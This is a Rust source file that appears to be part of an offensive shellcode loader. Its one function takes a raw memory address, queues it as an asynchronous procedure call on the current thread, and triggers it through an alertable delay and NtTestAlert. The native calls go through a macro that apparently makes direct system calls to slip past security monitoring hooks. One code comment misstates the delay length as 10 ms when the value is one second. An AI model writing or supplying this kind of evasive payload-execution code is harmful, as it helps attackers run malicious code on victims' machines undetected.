use rust_veh_syscalls::syscall;
use std::ffi::c_void;
use std::ptr;
use windows::Win32::Foundation::HANDLE;

#[allow(non_snake_case)]
type NtQueueApcThread = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    ApcRoutine: Option<unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void)>,
    ApcArgument1: *mut c_void,
    ApcArgument2: *mut c_void,
    ApcArgument3: *mut c_void,
) -> i32;

#[allow(non_snake_case)]
type NtDelayExecution = unsafe extern "system" fn(
    Alertable: u8,
    DelayInterval: *mut i64,
) -> i32;

#[allow(non_snake_case)]
type NtTestAlert = unsafe extern "system" fn() -> i32;

pub unsafe fn exec(p: usize) -> Result<(), String> {
    // Use the current thread pseudo-handle (-2).
    const CURRENT_THREAD: HANDLE = HANDLE(-2isize as isize);

    // Queue APC
    let queue_status = syscall!(
        "NtQueueApcThread",
        NtQueueApcThread,
        CURRENT_THREAD,
        Some(core::mem::transmute::<usize, unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void)>(p)),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut()
    );

    if queue_status != 0 {
        return Err(format!("NtQueueApcThread failed: 0x{:x}", queue_status));
    }

    // Alertable wait to deliver APC
    // Relative interval: -1_000_000 * 10ns = -10ms (alertable sleep)
    let mut interval: i64 = -10_000_000;

    let delay_status = syscall!(
        "NtDelayExecution",
        NtDelayExecution,
        1u8, // Alertable = TRUE
        &mut interval as *mut i64
    );

    if delay_status == 0 {
        // Ensure pending APCs are delivered
        let _test_status = syscall!(
            "NtTestAlert",
            NtTestAlert,
        );
        Ok(())
    } else {
        Err(format!("NtDelayExecution failed: 0x{:x}", delay_status))
    }
}
